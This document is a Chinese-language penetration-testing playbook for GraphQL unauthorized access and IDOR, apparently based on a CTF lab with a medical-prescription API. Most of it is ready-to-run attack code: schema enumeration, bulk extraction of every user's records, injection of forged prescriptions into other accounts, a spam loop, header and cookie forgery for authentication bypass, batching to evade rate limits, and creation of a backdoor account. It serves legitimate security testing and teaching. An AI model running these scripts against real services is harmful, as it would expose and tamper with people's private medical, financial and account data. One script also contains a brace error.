# GraphQL 未授权访问与 IDOR 攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 GraphQL API 未授权访问与 IDOR（不安全直接对象引用）漏洞检测与利用流程。涵盖 GraphQL 架构识别、未授权访问检测、水平/垂直权限提升等攻击技术。

## 1.2 适用范围

本文档适用于使用 GraphQL API 的 Web 应用，特别是：
- GraphQL 端点无认证要求的 API
- 存在 IDOR 漏洞的 GraphQL 查询/突变
- 使用用户 ID 参数但无所有权验证的 GraphQL 操作
- GraphiQL 调试界面公开暴露的应用

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

GraphQL 未授权访问与 IDOR 攻击是指攻击者通过直接调用 GraphQL API 端点，绕过前端认证控制，访问或修改未授权数据。

**本质问题**：
- GraphQL 端点未实施认证中间件
- Resolver 函数缺少所有权验证
- 用户可控参数（如 userId）直接用于数据库查询
- 依赖前端进行权限控制（前端禁用检查）

### GraphQL 架构特点

**典型 GraphQL 配置**：
```python
from flask_graphql import GraphQLView
from flask import Flask

app = Flask(__name__)

# 危险配置：无认证保护的 GraphQL 端点
app.add_url_rule(
    '/api',
    view_func=GraphQLView.as_view('api', schema=schema, graphiql=True)
)
```

**典型 IDOR 漏洞 Resolver**：
```python
class Query(graphene.ObjectType):
    # 漏洞：接受任意 userId 参数，无所有权验证
    get_prescriptions = graphene.List(
        PrescriptionType,
        user_id=graphene.Int(required=True)
    )

    def resolve_get_prescriptions(self, info, user_id):
        # 危险：直接使用用户提供的 userId
        return Prescription.query.filter_by(user_id=user_id).all()
```

### 常见 CWE 映射

| CWE 编号 | 描述 | 风险等级 |
|---------|------|---------|
| CWE-862 | 缺少授权 | CRITICAL |
| CWE-639 | 授权机制不当 | HIGH |
| CWE-285 | 权限不足 | HIGH |
| CWE-200 | 信息泄露 | MEDIUM |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 医疗系统 | 处方管理 API | GraphQL 端点无认证，可访问任意患者数据 |
| 电商平台 | 订单查询 API | 可查询任意用户订单历史 |
| 社交平台 | 用户资料 API | 可获取任意用户私密信息 |
| 金融服务 | 账户查询 API | 可访问他人账户余额和交易 |
| SaaS 系统 | 多租户数据 | 租户隔离失效，跨租户数据访问 |

## 2.3 漏洞发现方法

### 2.3.1 GraphQL 端点识别

**手动探测**：

```bash
# 1. 访问 GraphiQL 界面（如果启用）
curl http://target.com/api

# 2. 发送 introspection 查询
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# 3. 检查常见 GraphQL 路径
for path in /api /graphql /graphiql /v1/api /v1/graphql; do
    response=$(curl -s -o /dev/null -w "%{http_code}" http://target.com$path)
    echo "$path: HTTP $response"
done
```

**自动化扫描脚本**：

```python
#!/usr/bin/env python3
"""
GraphQL 端点扫描脚本
识别目标应用中的 GraphQL API 端点
"""

import requests
from urllib.parse import urljoin

COMMON_PATHS = [
    '/api', '/graphql', '/graphiql',
    '/v1/api', '/v1/graphql', '/v1/graphiql',
    '/api/graphql', '/api/graphiql',
    '/graphql/api', '/gql', '/query'
]

INTROSPECTION_QUERY = '''
{
    __schema {
        types {
            name
            description
            fields {
                name
                description
            }
        }
    }
}
'''

def is_graphql_endpoint(base_url, path):
    """检查路径是否为 GraphQL 端点"""
    url = urljoin(base_url, path)

    # 方法 1: 检查 GraphiQL 界面
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            if 'graphiql' in response.text.lower() or 'graphql' in response.text.lower():
                return True
    except:
        pass

    # 方法 2: 发送 introspection 查询
    try:
        response = requests.post(
            url,
            json={'query': INTROSPECTION_QUERY},
            headers={'Content-Type': 'application/json'},
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and '__schema' in data.get('data', {}):
                return True
    except:
        pass

    return False

def scan_graphql_endpoints(base_url):
    """扫描所有可能的 GraphQL 端点"""
    print(f"[*] Scanning GraphQL endpoints on {base_url}\n")

    found_endpoints = []

    for path in COMMON_PATHS:
        url = urljoin(base_url, path)
        print(f"[*] Checking {url}...", end=' ')

        if is_graphql_endpoint(base_url, path):
            print("✓ FOUND")
            found_endpoints.append(url)
        else:
            print("✗")

    print(f"\n[+] Found {len(found_endpoints)} GraphQL endpoint(s):")
    for endpoint in found_endpoints:
        print(f"    - {endpoint}")

    return found_endpoints

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python scan_graphql.py <base_url>")
        sys.exit(1)
    scan_graphql_endpoints(sys.argv[1])
```

### 2.3.2 认证要求检测

**未授权访问检测**：

```python
#!/usr/bin/env python3
"""
GraphQL 认证检测脚本
测试 GraphQL 端点是否需要认证
"""

import requests

def test_graphql_auth(endpoint_url):
    """测试 GraphQL 端点是否需要认证"""
    print(f"[*] Testing authentication requirement on {endpoint_url}\n")

    # 测试 1: 无认证访问
    print("[*] Test 1: Unauthenticated access")
    response = requests.post(
        endpoint_url,
        json={'query': '{ __schema { types { name } } }'},
        headers={'Content-Type': 'application/json'}
    )

    if response.status_code == 200:
        print("    ✓ Endpoint accessible without authentication")
        unauth_accessible = True
    elif response.status_code in [401, 403]:
        print("    ✗ Endpoint requires authentication")
        unauth_accessible = False
    else:
        print(f"    ? Unexpected response: HTTP {response.status_code}")
        unauth_accessible = False

    # 测试 2: 使用无效会话访问
    print("\n[*] Test 2: Invalid session access")
    response = requests.post(
        endpoint_url,
        json={'query': '{ __schema { types { name } } }'},
        headers={'Content-Type': 'application/json'},
        cookies={'session': 'invalid_session_cookie'}
    )

    if response.status_code == 200:
        print("    ✓ Endpoint accessible with invalid session")
    else:
        print("    ✗ Invalid session rejected")

    # 测试 3: 敏感查询测试
    print("\n[*] Test 3: Sensitive query test")

    # 尝试查询用户数据（假设 userId=1 是管理员）
    test_queries = [
        '{ getPrescriptions(userId: 1) { id } }',
        '{ getUser(id: 1) { id username } }',
        '{ orders(userId: 1) { id } }',
    ]

    for query in test_queries:
        response = requests.post(
            endpoint_url,
            json={'query': query},
            headers={'Content-Type': 'application/json'}
        )

        if response.status_code == 200:
            data = response.json()
            if 'errors' not in data:
                print(f"    ✓ Query successful: {query[:50]}...")
            else:
                print(f"    ✗ Query failed: {data['errors']}")
        else:
            print(f"    ✗ HTTP {response.status_code}")

    return unauth_accessible

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python test_graphql_auth.py <graphql_endpoint>")
        sys.exit(1)
    test_graphql_auth(sys.argv[1])
```

### 2.3.3 IDOR 漏洞检测

**手动测试**：

```bash
# 1. 查询用户 ID 1 的数据（管理员）
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ getPrescriptions(userId: 1) { id prescriptionDetails } }"}'

# 2. 查询用户 ID 2 的数据（普通用户）
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ getPrescriptions(userId: 2) { id prescriptionDetails } }"}'

# 3. 比较响应，确认是否可访问他人数据
```

**自动化检测脚本**：

```python
#!/usr/bin/env python3
"""
GraphQL IDOR 漏洞检测脚本
检测 GraphQL 查询是否存在 IDOR 漏洞
"""

import requests
import json

class GraphQLIDORDetector:
    def __init__(self, endpoint_url):
        self.endpoint_url = endpoint_url
        self.session = requests.Session()

    def test_query_idor(self, query_template, target_ids):
        """测试查询 IDOR"""
        print(f"[*] Testing IDOR on query: {query_template}\n")

        results = {}
        for user_id in target_ids:
            query = query_template.format(user_id=user_id)
            response = self.session.post(
                self.endpoint_url,
                json={'query': query},
                headers={'Content-Type': 'application/json'}
            )

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and 'errors' not in data:
                    result_data = data['data']
                    # 获取第一个键作为结果
                    key = list(result_data.keys())[0]
                    items = result_data[key]
                    count = len(items) if isinstance(items, list) else 1
                    results[user_id] = {'success': True, 'count': count, 'data': items}
                    print(f"    User {user_id}: {count} items retrieved")
                else:
                    results[user_id] = {'success': False, 'error': data.get('errors', 'Unknown error')}
                    print(f"    User {user_id}: Failed - {data.get('errors', 'Unknown')}")
            else:
                results[user_id] = {'success': False, 'http_status': response.status_code}
                print(f"    User {user_id}: HTTP {response.status_code}")

        # 分析 IDOR 漏洞
        successful_access = [uid for uid, r in results.items() if r.get('success')]
        if len(successful_access) > 1:
            print(f"\n[!] POTENTIAL IDOR VULNERABILITY")
            print(f"    Can access data for user IDs: {successful_access}")
        elif len(successful_access) == 1:
            print(f"\n[*] Only own data accessible (user ID: {successful_access[0]})")
        else:
            print(f"\n[-] No data accessible")

        return results

    def test_mutation_idor(self, mutation_template, target_ids):
        """测试突变 IDOR"""
        print(f"[*] Testing mutation IDOR: {mutation_template}\n")

        for user_id in target_ids:
            mutation = mutation_template.format(user_id=user_id)
            response = self.session.post(
                self.endpoint_url,
                json={'query': mutation},
                headers={'Content-Type': 'application/json'}
            )

            print(f"    User {user_id}: HTTP {response.status_code}")
            if response.status_code == 200:
                data = response.json()
                print(f"    Response: {json.dumps(data, indent=2)[:200]}")

def main():
    import sys
    if len(sys.argv) < 2:
        print("Usage: python graphql_idor.py <endpoint_url>")
        sys.exit(1)

    endpoint_url = sys.argv[1]
    detector = GraphQLIDORDetector(endpoint_url)

    # 测试查询 IDOR
    print("=" * 60)
    print("QUERY IDOR TEST")
    print("=" * 60)
    detector.test_query_idor(
        '{{ getPrescriptions(userId: {user_id}) {{ id prescriptionDetails }} }}',
        [1, 2, 3]
    )

    # 测试突变 IDOR
    print("\n" + "=" * 60)
    print("MUTATION IDOR TEST")
    print("=" * 60)
    detector.test_mutation_idor(
        'mutation {{ addPrescription(userId: {user_id}, prescriptionDetails: "Test") {{ prescription {{ id }} }} }}',
        [1, 2]
    )

if __name__ == '__main__':
    main()
```

### 2.3.4 Schema 枚举

**Schema 信息收集**：

```bash
# 获取完整 Schema
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind } } } } }"
  }' | jq

# 获取所有查询操作
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name description } } } }"}'

# 获取所有突变操作
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name description } } } }"}'
```

**Python Schema 枚举工具**：

```python
#!/usr/bin/env python3
"""
GraphQL Schema 枚举工具
提取 GraphQL API 的完整 schema 信息
"""

import requests
import json

INTROSPECTION_QUERY = '''
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
            name
            kind
            description
            fields {
                name
                description
                args {
                    name
                    type {
                        name
                        kind
                    }
                }
                type {
                    name
                    kind
                    fields {
                        name
                        type { name }
                    }
                }
            }
        }
    }
}
'''

def enumerate_schema(endpoint_url):
    """枚举 GraphQL schema"""
    print(f"[*] Enumerating GraphQL schema on {endpoint_url}\n")

    response = requests.post(
        endpoint_url,
        json={'query': INTROSPECTION_QUERY},
        headers={'Content-Type': 'application/json'}
    )

    if response.status_code != 200:
        print(f"[-] Failed to retrieve schema: HTTP {response.status_code}")
        return None

    data = response.json()
    if 'errors' in data:
        print(f"[-] Schema introspection failed: {data['errors']}")
        return None

    schema = data['data']['__schema']

    # 输出查询类型
    print("=" * 60)
    print("QUERY OPERATIONS")
    print("=" * 60)
    query_type_name = schema['queryType']['name']
    query_type = next(t for t in schema['types'] if t['name'] == query_type_name)

    for field in query_type['fields']:
        args = ', '.join([f"{a['name']}: {a['type']['name']}" for a in field['args']])
        print(f"  {field['name']}({args})")
        if field['description']:
            print(f"    Description: {field['description']}")

    # 输出突变类型
    if schema['mutationType']:
        print("\n" + "=" * 60)
        print("MUTATION OPERATIONS")
        print("=" * 60)
        mutation_type_name = schema['mutationType']['name']
        mutation_type = next(t for t in schema['types'] if t['name'] == mutation_type_name)

        for field in mutation_type['fields']:
            args = ', '.join([f"{a['name']}: {a['type']['name']}" for a in field['args']])
            print(f"  {field['name']}({args})")
            if field['description']:
                print(f"    Description: {field['description']}")

    # 输出敏感字段
    print("\n" + "=" * 60)
    print("POTENTIALLY SENSITIVE FIELDS")
    print("=" * 60)
    sensitive_keywords = ['password', 'token', 'secret', 'key', 'flag', 'credit', 'ssn']

    for type_def in schema['types']:
        if type_def['fields']:
            for field in type_def['fields']:
                field_name = field['name'].lower()
                if any(keyword in field_name for keyword in sensitive_keywords):
                    print(f"  {type_def['name']}.{field['name']}")

    return schema

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python graphql_enum.py <endpoint_url>")
        sys.exit(1)
    enumerate_schema(sys.argv[1])
```

## 2.4 漏洞利用方法

### 2.4.1 未授权数据读取

**前提条件**：
- GraphQL 端点无认证要求
- 查询操作接受用户 ID 参数

**利用步骤**：

```bash
# 1. 枚举所有用户的数据
for user_id in {1..100}; do
    echo "=== User $user_id ==="
    curl -s -X POST http://localhost:5003/api \
      -H "Content-Type: application/json" \
      -d "{\"query\": \"{ getPrescriptions(userId: $user_id) { id prescriptionDetails flag } }\"}" \
      | jq '.data.getPrescriptions'
done

# 2. 查找特定数据（如包含 flag 的记录）
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ getPrescriptions(userId: 1) { id prescriptionDetails flag } }"}' \
  | jq '.data.getPrescriptions[] | select(.flag != null)'
```

**Python 自动化提取脚本**：

```python
#!/usr/bin/env python3
"""
GraphQL 未授权数据提取脚本
批量提取所有用户数据
"""

import requests
import json
from concurrent.futures import ThreadPoolExecutor

def extract_user_data(endpoint_url, user_id):
    """提取单个用户的数据"""
    query = f'{{ getPrescriptions(userId: {user_id}) {{ id prescriptionDetails flag }} }}'

    response = requests.post(
        endpoint_url,
        json={'query': query},
        headers={'Content-Type': 'application/json'}
    )

    if response.status_code == 200:
        data = response.json()
        if 'data' in data and 'getPrescriptions' in data['data']:
            prescriptions = data['data']['getPrescriptions']
            return {
                'user_id': user_id,
                'prescriptions': prescriptions,
                'flag': next((p['flag'] for p in prescriptions if p.get('flag')), None)
            }
    return None

def extract_all_users(endpoint_url, max_user_id=100):
    """提取所有用户数据"""
    print(f"[*] Extracting data for users 1-{max_user_id}\n")

    all_data = []
    flags_found = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(extract_user_data, endpoint_url, user_id): user_id
            for user_id in range(1, max_user_id + 1)
        }

        for future in futures:
            user_id = futures[future]
            try:
                result = future.result()
                if result and result['prescriptions']:
                    print(f"[+] User {user_id}: {len(result['prescriptions'])} prescriptions")
                    all_data.append(result)

                    if result['flag']:
                        print(f"    [!] FLAG FOUND: {result['flag']}")
                        flags_found.append(result['flag'])
            except Exception as e:
                print(f"[-] Error for user {user_id}: {e}")

    print(f"\n[+] Total users with data: {len(all_data)}")
    print(f"[+] Total flags found: {len(flags_found)}")

    # 保存结果
    with open('extracted_data.json', 'w') as f:
        json.dump(all_data, f, indent=2)
    print("[+] Data saved to extracted_data.json")

    return all_data, flags_found

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python graphql_extract.py <endpoint_url> [max_user_id]")
        sys.exit(1)

    endpoint_url = sys.argv[1]
    max_user_id = int(sys.argv[2]) if len(sys.argv) > 2 else 100

    extract_all_users(endpoint_url, max_user_id)
```

### 2.4.2 未授权数据写入

**前提条件**：
- GraphQL 突变端点无认证要求
- 突变操作接受用户 ID 参数

**利用步骤**：

```bash
# 1. 向管理员账户注入恶意数据
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { addPrescription(userId: 1, prescriptionDetails: \"ATTACKER_INJECTED: Malicious prescription\") { prescription { id userId } } }"
  }'

# 2. 验证注入成功
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ getPrescriptions(userId: 1) { id prescriptionDetails } }"}' \
  | grep "ATTACKER_INJECTED"

# 3. 批量注入（DoS 攻击演示）
for i in {1..100}; do
    curl -s -X POST http://localhost:5003/api \
      -H "Content-Type: application/json" \
      -d "{\"query\": \"mutation { addPrescription(userId: 1, prescriptionDetails: \\\"SPAM_$i\\\") { prescription { id } } }\"}" &
done
wait
```

**Python 注入脚本**：

```python
#!/usr/bin/env python3
"""
GraphQL 未授权数据注入脚本
向目标用户账户注入恶意数据
"""

import requests
import sys

def inject_prescription(endpoint_url, target_user_id, prescription_details):
    """向目标用户注入处方"""
    mutation = f'''
    mutation {{
        addPrescription(
            userId: {target_user_id},
            prescriptionDetails: "{prescription_details}"
        ) {{
            prescription {{
                id
                userId
            }}
        }}
    }}
    '''

    response = requests.post(
        endpoint_url,
        json={'query': mutation},
        headers={'Content-Type': 'application/json'}
    )

    if response.status_code == 200:
        data = response.json()
        if 'data' in data and 'addPrescription' in data['data']:
            new_id = data['data']['addPrescription']['prescription']['id']
            print(f"[+] Injected prescription for user {target_user_id} (ID: {new_id})")
            return True
        else:
            print(f"[-] Injection failed: {data}")
            return False
    else:
        print(f"[-] HTTP {response.status_code}: {response.text}")
        return False

def main():
    if len(sys.argv) < 4:
        print("Usage: python graphql_inject.py <endpoint_url> <target_user_id> <prescription_details>")
        sys.exit(1)

    endpoint_url = sys.argv[1]
    target_user_id = int(sys.argv[2])
    prescription_details = sys.argv[3]

    inject_prescription(endpoint_url, target_user_id, prescription_details)

if __name__ == '__main__':
    main()
```

### 2.4.3 水平权限提升

**场景**：普通用户访问管理员数据

```python
#!/usr/bin/env python3
"""
GraphQL 水平权限提升攻击脚本
从普通用户权限提升到管理员权限
"""

import requests

class HorizontalPrivilegeEscalation:
    def __init__(self, endpoint_url):
        self.endpoint_url = endpoint_url
        self.session = requests.Session()

    def enumerate_users(self, max_id=100):
        """枚举所有用户"""
        print(f"[*] Enumerating users (ID 1-{max_id})...")
        valid_users = []

        for user_id in range(1, max_id + 1):
            query = f'{{ getPrescriptions(userId: {user_id}) {{ id }} }}'
            response = self.session.post(
                self.endpoint_url,
                json={'query': query},
                headers={'Content-Type': 'application/json'}
            )

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and 'getPrescriptions' in data['data']:
                    if data['data']['getPrescriptions']:
                        valid_users.append(user_id)
                        print(f"    User {user_id}: Found")

        return valid_users

    def identify_admin(self, users):
        """识别管理员账户"""
        print("[*] Identifying admin account...")

        for user_id in users:
            query = f'{{ getPrescriptions(userId: {user_id}) {{ id prescriptionDetails flag }} }}'
            response = self.session.post(
                self.endpoint_url,
                json={'query': query},
                headers={'Content-Type': 'application/json'}
            )

            if response.status_code == 200:
                data = response.json()
                if 'data' in data:
                    prescriptions = data['data']['getPrescriptions']
                    # 检查是否有 flag 字段（通常是管理员）
                    for p in prescriptions:
                        if p.get('flag'):
                            print(f"[+] Admin identified: User ID {user_id}")
                            print(f"    Flag: {p['flag']}")
                            return user_id

        # 如果没有 flag，假设 ID 最小的是管理员
        if users:
            admin_id = min(users)
            print(f"[+] Assuming admin is user ID {admin_id} (lowest ID)")
            return admin_id

        return None

    def escalate_access(self, admin_id):
        """提升到管理员访问"""
        print(f"[*] Escalating to admin access (user_id={admin_id})...")

        # 获取管理员所有数据
        query = f'{{ getPrescriptions(userId: {admin_id}) {{ id prescriptionDetails flag } }}'
        response = self.session.post(
            self.endpoint_url,
            json={'query': query},
            headers={'Content-Type': 'application/json'}
        )

        if response.status_code == 200:
            data = response.json()
            if 'data' in data:
                prescriptions = data['data']['getPrescriptions']
                print(f"[+] Retrieved {len(prescriptions)} admin prescriptions")

                # 查找敏感数据
                for p in prescriptions:
                    if p.get('flag'):
                        print(f"[!] SENSITIVE DATA FOUND: {p['flag']}")

                return prescriptions

        return None

def main():
    import sys
    if len(sys.argv) < 2:
        print("Usage: python graphql_escalate.py <endpoint_url>")
        sys.exit(1)

    endpoint_url = sys.argv[1]
    attacker = HorizontalPrivilegeEscalation(endpoint_url)

    # 1. 枚举用户
    users = attacker.enumerate_users(max_id=50)

    # 2. 识别管理员
    admin_id = attacker.identify_admin(users)

    # 3. 提升访问
    if admin_id:
        attacker.escalate_access(admin_id)

if __name__ == '__main__':
    main()
```

### 2.4.4 完整攻击流程

**综合攻击脚本**：

```python
#!/usr/bin/env python3
"""
GraphQL 未授权访问完整攻击脚本
综合运用多种技术实现数据窃取和权限提升
"""

import requests
import json
import sys

class GraphQLAttacker:
    def __init__(self, endpoint_url):
        self.endpoint_url = endpoint_url
        self.session = requests.Session()

    def recon(self):
        """侦察阶段：获取 schema 信息"""
        print("=" * 60)
        print("RECONNAISSANCE")
        print("=" * 60)

        introspection_query = '''
        {
            __schema {
                queryType { name }
                mutationType { name }
                types {
                    name
                    fields {
                        name
                        type { name }
                    }
                }
            }
        }
        '''

        response = self.session.post(
            self.endpoint_url,
            json={'query': introspection_query},
            headers={'Content-Type': 'application/json'}
        )

        if response.status_code == 200:
            data = response.json()
            if 'data' in data:
                print("[+] Schema introspection successful")
                return data['data']['__schema']

        print("[-] Schema introspection failed")
        return None

    def enumerate_data(self, schema):
        """枚举可访问的数据"""
        print("\n" + "=" * 60)
        print("DATA ENUMERATION")
        print("=" * 60)

        # 查找包含 userId 参数的查询
        query_type = schema['queryType']['name']
        for type_def in schema['types']:
            if type_def['name'] == query_type and type_def['fields']:
                for field in type_def['fields']:
                    print(f"[*] Query: {field['name']}")
                    if field['args']:
                        args = ', '.join([a['name'] for a in field['args']])
                        print(f"    Args: {args}")

    def exploit_idor(self):
        """利用 IDOR 漏洞"""
        print("\n" + "=" * 60)
        print("IDOR EXPLOITATION")
        print("=" * 60)

        # 尝试常见查询模式
        test_queries = [
            '{ getPrescriptions(userId: 1) { id prescriptionDetails flag } }',
            '{ getPrescriptions(userId: 2) { id prescriptionDetails flag } }',
            '{ getUser(id: 1) { id username email } }',
            '{ orders(userId: 1) { id total } }',
        ]

        flags_found = []

        for query in test_queries:
            response = self.session.post(
                self.endpoint_url,
                json={'query': query},
                headers={'Content-Type': 'application/json'}
            )

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and 'errors' not in data:
                    print(f"[+] Query successful: {query[:50]}...")

                    # 提取 flag
                    result = data['data']
                    for key, value in result.items():
                        if isinstance(value, list):
                            for item in value:
                                if isinstance(item, dict) and 'flag' in item and item['flag']:
                                    flags_found.append(item['flag'])
                                    print(f"    [!] FLAG: {item['flag']}")

        return flags_found

    def inject_data(self):
        """注入恶意数据"""
        print("\n" + "=" * 60)
        print("DATA INJECTION")
        print("=" * 60)

        mutation = '''
        mutation {
            addPrescription(
                userId: 1,
                prescriptionDetails: "ATTACKER_INJECTED: Security test"
            ) {
                prescription {
                    id
                    userId
                }
            }
        }
        '''

        response = self.session.post(
            self.endpoint_url,
            json={'query': mutation},
            headers={'Content-Type': 'application/json'}
        )

        if response.status_code == 200:
            data = response.json()
            if 'data' in data and 'addPrescription' in data['data']:
                new_id = data['data']['addPrescription']['prescription']['id']
                print(f"[+] Successfully injected prescription (ID: {new_id})")
                return True

        print("[-] Injection failed")
        return False

    def run_full_attack(self):
        """执行完整攻击流程"""
        print(f"[*] Starting full attack on {self.endpoint_url}\n")

        # 1. 侦察
        schema = self.recon()
        if not schema:
            print("[-] Recon failed, aborting")
            return

        # 2. 枚举
        self.enumerate_data(schema)

        # 3. 利用
        flags = self.exploit_idor()

        # 4. 注入
        self.inject_data()

        # 5. 报告
        print("\n" + "=" * 60)
        print("ATTACK SUMMARY")
        print("=" * 60)
        print(f"[+] Flags found: {len(flags)}")
        for flag in flags:
            print(f"    - {flag}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python graphql_attack.py <endpoint_url>")
        sys.exit(1)

    attacker = GraphQLAttacker(sys.argv[1])
    attacker.run_full_attack()

if __name__ == '__main__':
    main()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 认证绕过

**X-User-ID 头部绕过**：

```python
# 某些应用可能使用自定义头部进行用户识别
headers = {
    'X-User-ID': '1',  # 伪造管理员 ID
    'X-Forwarded-User': 'admin',
    'X-Auth-User': 'administrator'
}

response = requests.post(
    endpoint_url,
    json={'query': query},
    headers=headers
)
```

**Cookie 注入绕过**：

```python
# 如果应用同时检查 Cookie 和 GraphQL 参数
cookies = {
    'user_id': '1',
    'session': 'forged_session_cookie'
}

response = requests.post(
    endpoint_url,
    json={'query': query},
    cookies=cookies
)
```

### 2.5.2 速率限制绕过

**批量化查询**：

```graphql
# 使用 GraphQL 批量化查询绕过速率限制
[
  {"query": "{ getPrescriptions(userId: 1) { id } }"},
  {"query": "{ getPrescriptions(userId: 2) { id } }"},
  {"query": "{ getPrescriptions(userId: 3) { id } }"}
]
```

**别名查询**：

```graphql
# 使用别名在单个请求中查询多个用户
{
  user1: getPrescriptions(userId: 1) { id }
  user2: getPrescriptions(userId: 2) { id }
  user3: getPrescriptions(userId: 3) { id }
}
```

## 2.6 后渗透利用

### 2.6.1 数据 exfiltration

```bash
# 完整导出所有数据
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag createdAt } }"}' \
  | jq '.data.getPrescriptions' > admin_prescriptions.json
```

### 2.6.2 持久化访问

```bash
# 创建后门账户（如果应用支持）
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { createUser(username: \"backdoor\", password: \"backdoor123\") { user { id } } }"}'
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 目标 | Payload | 说明 |
|-----|---------|------|
| Schema 枚举 | `{ __schema { types { name } } }` | 获取 GraphQL schema |
| 查询操作 | `{ getPrescriptions(userId: 1) { id } }` | 查询用户数据 |
| 突变操作 | `mutation { addPrescription(...) }` | 创建新数据 |
| 批量查询 | `{ u1: getPrescriptions(userId:1) u2: getPrescriptions(userId:2) }` | 单次请求查询多用户 |
| 深度查询 | `{ getPrescriptions(userId: 1) { id user { id username } } }` | 关联查询 |

## 3.2 工具推荐

| 工具 | 用途 | 链接 |
|-----|------|------|
| GraphiQL | GraphQL 调试界面 | 内置于大多数 GraphQL 服务 |
| GraphQL Playground | 高级 GraphQL IDE | https://github.com/prisma-labs/graphql-playground |
| InQL | Burp GraphQL 扫描器 | https://github.com/doyensec/inql |
| GraphQL Voyager | GraphQL schema 可视化 | https://github.com/APIs-guru/graphql-voyager |

## 3.3 修复建议

1. **实施认证中间件** - 所有 GraphQL 操作需要认证
2. **添加所有权验证** - Resolver 中验证 `user_id == current_user.id`
3. **移除用户 ID 参数** - 从当前用户会话获取 user_id
4. **实施查询复杂度限制** - 防止深度查询攻击
5. **禁用生产环境 GraphiQL** - 避免 schema 泄露
6. **添加速率限制** - 限制 GraphQL 查询频率

---

**文档版本**：1.0
**最后更新**：2026-03-09
**参考来源**：XBEN-007-24 MedGuard GraphQL 渗透测试实战
